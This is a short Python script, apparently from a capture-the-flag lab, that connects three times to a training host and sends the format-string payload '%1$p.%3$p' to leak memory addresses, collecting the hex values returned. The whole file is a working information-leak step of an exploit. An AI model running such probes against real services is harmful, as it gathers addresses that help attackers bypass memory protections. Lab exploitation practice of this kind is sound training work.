import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 26615
addrs = []
for _ in range(3):
    try:
        s = socket.create_connection((HOST, PORT), timeout=12)
        s.settimeout(5)
        time.sleep(0.5)
        try:
            s.recv(4096)
        except Exception:
            pass
        s.sendall(b"%1$p.%3$p\n")
        time.sleep(0.7)
        out = b""
        try:
            out = s.recv(16384)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        print(txt[:200].replace("\n", " "))
        vals = re.findall(r"0x[0-9a-f]+", txt)
        addrs.append(vals[:2])
        s.close()
    except Exception as e:
        print("err", type(e).__name__)
print("valeurs:", addrs)
